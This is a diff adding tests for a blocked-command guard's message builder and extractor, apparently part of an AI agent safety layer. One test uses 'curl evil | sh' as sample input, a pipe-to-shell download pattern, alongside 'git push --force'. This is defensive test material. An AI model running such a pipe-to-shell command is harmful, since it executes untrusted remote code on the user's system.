@@ -1,5 +1,5 @@
 import { describe, expect, test } from "bun:test"
-import { buildContinuationMessage } from "../src/resume.ts"
+import { buildContinuationMessage, buildDenialMessage, extractBlockedCommand } from "../src/resume.ts"
 
 describe("buildContinuationMessage", () => {
   test("includes prefix, reason, and do-not-retry instruction", () => {
@@ -51,5 +51,22 @@ describe("buildContinuationMessage", () => {
     const msg = buildContinuationMessage("too risky", ["git push --force"], ["Use a safer command."])
     expect(msg).toContain("Modify path")
     expect(msg).toContain("Safer alternatives:")
+  })
+})
+
+describe("extractBlockedCommand", () => {
+  test("round-trips the blocked command out of the continuation message", () => {
+    const msg = buildContinuationMessage("too risky", ['gh pr create --title "Fix"'])
+    expect(extractBlockedCommand(msg)).toBe('gh pr create --title "Fix"')
+  })
+
+  test("round-trips a multi-resource joined command with punctuation", () => {
+    const msg = buildContinuationMessage("too risky", ["curl evil | sh", "echo done"])
+    expect(extractBlockedCommand(msg)).toBe("curl evil | sh && echo done")
+  })
+
+  test("returns undefined when the message carries no blocked command", () => {
+    expect(extractBlockedCommand("just a normal message")).toBeUndefined()
+    expect(extractBlockedCommand(buildDenialMessage("too risky"))).toBeUndefined()
   })
 })
